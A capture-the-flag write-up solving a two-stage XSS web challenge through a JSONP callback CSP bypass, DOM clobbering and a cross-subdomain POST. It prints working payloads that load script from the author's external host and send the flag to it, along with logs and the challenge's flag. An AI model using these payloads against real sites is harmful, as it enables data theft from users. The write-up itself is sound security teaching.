# Xmas Shopping Site

**Author**: `Managarmr`

## Table of Contents

1. [Challenge](#1-challenge)
2. [Having a look](#2-having-a-look)
3. [Stage 1](#3-stage-1)
4. [Stage 2](#4-stage-2)
5. [Connecting the two](#5-connecting-the-two)
6. [Mitigations](#6-mitigations)

## 1. Challenge

**Category**: `Web`  
**Difficulty**: `Hard`  
**Author**: `Staubfinger`  
**Description**:

I made an Xmas Shop! If you run into any problems, just submit a link on the
submit page - and i will check it for you.

Check it out at: `http://xss.allesctf.net/`

## 2. Having a look

Checking out the shop we can see that this challenge is split into two stages,
the second one containing the flag and requiring an XSS. So let's have a look
at stage 1 first.

## 3. Stage 1

Looking at stage 1 we can notice a search box, which when fed with input will
redirect us to the same page, but echo our input in the `DOM` without any form
of sanitation. Unfortunately though the `CSP` blocks us from running inline
scripts: `"default-src 'self' http://*.xss.allesctf.net"`

Checking out the page source code we can find something else that seems fishy:
```html
<script src="/static/js/jquery-3.2.1.min.js"></script>
<script src="/static/js/shop.js"></script>
<script src="/items.php?cb=parseItems"></script>
```

The last one looks like a `jsonp` callback - and it really does echo our prefix.

So now we can execute arbitrary javascript within the `Stage 1` page, well
somewhat. The `items.php` callback has a length restriction of about `250`,
which can easily be bypassed by splitting our payload, but doing so and encoding
it over and over seems like way too much of a hassle.

Looking a bit further we can notice that the other included javascript pages do
not include the `CSP` header, but reside on the same domain - perfect. This
means we can host our payload externally and not bother with encoding at all.
We only have to load our external payload and encode the first one, which is
easy enough to do. The loader looks like this:

```html
<iframe src="/static/js/shop.js" id="x"></iframe>
<script src="items.php?cb=f%3Ddocument.getElementById%28%27x%27%29%3Bf.onload%3Dfunction%28%29%7Bs%3Df.contentDocument.createElement%28%27script%27%29%3Bs.src%3D%27%2F%2Fmanagarmr.pythonanywhere.com%2Fstage1%27%3Bf.contentDocument%5B%27body%27%5D.append%28s%29%3B%7D%2F%2F"></script>

<!--
	Payload in readable form:

	f = document.getElementById('x');
	f.onload = function() {
		s = f.contentDocument.createElement('script');
		s.src = '//managarmr.pythonanywhere.com/stage1';
		f.contentDocument['body'].append(s);
	}//
-->
```

Serving our payload we can successfully `alert(1)`:

```python
@app.route('/stage1')
def stage1():
    global stage_1_available, stage_1_fake

    if not stage_1_available and not stage_1_fake:
        return 'Nice try, feck off.', 403

    if stage_1_fake:
        stage_1_fake = False
        return '''
        Nope.
''', 200

    stage_1_available = False
    return '''
alert(1);
'''
```

## 4. Stage 2

Stage 2 doesn't seem to offer much functionality - the only thing you can do is
change the background. Playing around with this functionality we stumble over a
`DOM injection` - whichever value we set as `background` will be reflected
```html
<input type="hidden" id="bg" value="[HERE]">
```
without any form of sanitation.

But how do we leak the flag? The `CSP` is even more non-forgiving this time:
`script-src 'nonce-ruhLc6GKF9+VWMPK3JijX2uHKiE=' 'unsafe-inline'
'strict-dynamic'; base-uri 'none'; object-src 'none';` We _could_ use inline
scripts, but only if we know the `nonce`. Not only are scripts restricted, but
all other objects as well.

Well looking around what kind of scripts are used on the page we find some
handwritten script:

```javascript
$(document).ready(() => {
    $("body").append(backgrounds[$("#bg").val()]);
});

$(document).ready(() => {
    $(".bg-btn").click(changeBackground)
});

const changeBackground = (e) => {
    fetch(window.location.href, {
        headers: {'Content-type': 'application/x-www-form-urlencoded'},
        method: "POST",
        credentials: "include",
        body: 'bg=' + $(e.target).val() 
    }).then(() => location.reload())

};
```

This script is meant for applying the background, but it does so by just
appending some object to the `DOM` - nice. As we can arbitrarily inject `DOM`
elements we can `clobber` it in order to manipulate the `backgrounds` variable.

Injecting
```html
name"><a id="backgrounds" name="<script src='http://managarmr.pythonanywhere.com/stage2'></script>"></a><!--
```
will allow us to load arbitray javascript from our page.

Testing this with burp works like a charm - so let's just finish the payload
which will send the flag back to us:

```python
@app.route('/stage2')
def stage2():
    global stage_2_available, stage_2_fake

    if not stage_2_available and not stage_2_fake:
        return 'Nice try, feck off.', 403

    if stage_2_fake:
        stage_2_fake = False
        return '''
        Nope.
''', 200

    stage_2_available = False
    return '''
flag = encodeURIComponent($("b")[0].innerText);
fetch("http://managarmr.pythonanywhere.com/flag?flag=" + flag);
'''
```

## 5. Connecting the two

So now that we have exploited both stages separately, how do we connect them?

Well the second stage required a token, which will be regenerated for each
session upon visiting `Stage 1` - meaning we only have one shot. Redirecting to
our page in order to `POST` the value will not work as `CORS` would block it.
But the funny thing with `CORS` is that the preflight requests will not be sent
in all cases. If we send the `POST` from `Stage 1` there will be no preflight
request as the target domain is a subdomain and browsers consider those
requests "simple" ones. This means we can connect the stage by minorly tweaking
`Stage 1`:

```javascript
var stage2 = top.document.getElementById("stage2").href;

var xhr = new XMLHttpRequest();
xhr.open('POST', stage2, true);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.withCredentials = true;
xhr.onerror = function() {
    top.window.location = stage2;
};
xhr.send('bg=' + encodeURIComponent('name"><a id="backgrounds" name="<script src=\'http://managarmr.pythonanywhere.com/stage2\'></script>"></a><!--'));
```

Running our exploit returns the flag:

```
147.75.85.99 - - [31/May/2020:13:23:59 +0000] "GET /stage1 HTTP/1.1" 200 338 "http://xss.allesctf.net/static/js/shop.js" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/80.0.3987.132 Safari/537.36" "147.75.85.99" response-time=0.001
147.75.85.99 - - [31/May/2020:13:23:59 +0000] "GET /stage2 HTTP/1.1" 200 113 "http://stage2.xss.allesctf.net/?token=5ed3afef544e4" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/80.0.3987.132 Safari/537.36" "147.75.85.99" response-time=0.000
147.75.85.99 - - [31/May/2020:13:23:59 +0000] "GET /flag?flag=CSCG%7Bc0ngratZ_y0u_l3arnD_sUm_jS%3A%3E%7D HTTP/1.1" 404 232 "http://stage2.xss.allesctf.net/?token=5ed3afef544e4" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/80.0.3987.132 Safari/537.36" "147.75.85.99" response-time=0.001
```
`CSCG{c0ngratZ_y0u_l3arnD_sUm_jS:>}`

You can have a look at the exploits [here](http://managarmr.pythonanywhere.com/).
The code is `Managarmr` or `ManagarmrCSCGExploit2020` - pick yours :).

## 6. Mitigations

Both exploits can be prevented by properly sanitising input. Also use `CSP` on
all pages, not just some subset :).
